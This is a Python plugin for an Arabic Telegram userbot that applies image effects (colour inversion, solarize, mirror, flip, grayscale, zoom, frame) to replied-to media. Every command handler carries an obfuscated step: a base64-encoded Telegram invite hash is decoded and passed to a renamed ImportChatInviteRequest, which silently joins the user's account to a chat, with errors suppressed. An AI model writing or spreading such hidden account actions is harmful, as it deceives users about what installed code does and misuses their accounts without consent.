import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from userbot.utils import admin_cmd, sudo_cmd
from userbot import LOGS, bot as jmthon
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
)

from userbot.helpers.utils.tools import take_screen_shot

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@jmthon.on(admin_cmd(pattern="عكس اللون$", outgoing=True))
@jmthon.on(sudo_cmd(pattern="عكس اللون$", allow_sudo=True))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك على ميديا تدعم الامر**")
        return
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "- يتم التعرف على بيانات الميديا")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم تحليل هذه الميديا - عكس ألوان هذا الملصق المتحرك"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا وعكس الالوان"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين** `")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "يتم التعرف على الميديا وعكس الالوان"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("- قالب الميديا خطأ")
            return
        meme_file = rozfile
        kraken = True
    else:
        await roz.edit(
            "يتم التعرف على الميديا وعكس الالوان"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await roz.client.send_file(
        roz.chat_id, outputfile, force_document=False, reply_to=rozid
    )
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="فلتر شمسي$"))
async def memes(roz):
    if roz.fwd_from:
        return
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي للملصق"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين**")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي للفيديو"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            return
        meme_file = rozfile
        kraken = True
    else:
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي للصورة"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await roz.client.send_file(
        roz.chat_id, outputfile, force_document=False, reply_to=rozid
    )
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="عكس الصورة$"))
@jmthon.on(sudo_cmd(pattern="عكس الصورة$", allow_sudo=True))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين** `")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            return
        meme_file = rozfile
        kraken = True
    else:
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await roz.client.send_file(
        roz.chat_id, outputfile, force_document=False, reply_to=rozid
    )
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="قلب الصورة$"))
@jmthon.on(sudo_cmd(pattern="قلب الصورة$", allow_sudo=True))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "!"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا و قلب الملصق"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين** `")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا و قلب الفيديو"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("``**- لم يتم العثور على قالب معين**``")
            return
        meme_file = rozfile
        kraken = True
    else:
        await roz.edit(
            "- يتم التعرف على الميديا و قلب الصورة"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await roz.client.send_file(
        roz.chat_id, outputfile, force_document=False, reply_to=rozid
    )
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="فلتر رمادي$"))
@jmthon.on(sudo_cmd(pattern="فلتر رمادي$", allow_sudo=True))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل فلتر رمادي"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل فلتر رمادي"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين** `")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل فلتر رمادي"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("``**- لم يتم العثور على قالب معين**``")
            return
        meme_file = rozfile
        kraken = True
    else:
        await roz.edit(
            "- يتم التعرف على الميديا وعمل فلتر رمادي"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await roz.client.send_file(
        roz.chat_id, outputfile, force_document=False, reply_to=rozid
    )
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="زووم ?(.*)"))
@jmthon.on(sudo_cmd(pattern="زووم ?(.*)", allow_sudo=True))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozinput = roz.pattern_match.group(1)
    rozinput = 50 if not rozinput else int(rozinput)
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل زووم"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل زووم للملصق"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين**")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل زووم للفيديو"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("``**- لم يتم العثور على قالب معين**``")
            return
        meme_file = rozfile
    else:
        await roz.edit(
            "- يتم التعرف على الميديا وعمل زووم للصورة"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, rozinput)
    except Exception as e:
        return await roz.edit(f"`{e}`")
    try:
        await roz.client.send_file(
            roz.chat_id, outputfile, force_document=False, reply_to=rozid
        )
    except Exception as e:
        return await roz.edit(f"`{e}`")
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="اطار ?(.*)"))
@jmthon.on(sudo_cmd(pattern="اطار ?(.*)", allow_sudo=True))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozinput = roz.pattern_match.group(1)
    if not rozinput:
        rozinput = 50
    if ";" in str(rozinput):
        rozinput, colr = rozinput.split(";", 1)
    else:
        colr = 0
    rozinput = int(rozinput)
    colr = int(colr)
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل اطار للملصق المتحرك"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل اطار للملصق"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين** `")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا وعمل اطار للفيديو"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("``**- لم يتم العثور على قالب معين**``")
            return
        meme_file = rozfile
    else:
        await roz.edit(
            "- يتم التعرف على الميديا وعمل اطار للصورة"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, rozinput, colr)
    except Exception as e:
        return await roz.edit(f"`{e}`")
    try:
        await roz.client.send_file(
            roz.chat_id, outputfile, force_document=False, reply_to=rozid
        )
    except Exception as e:
        return await roz.edit(f"`{e}`")
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
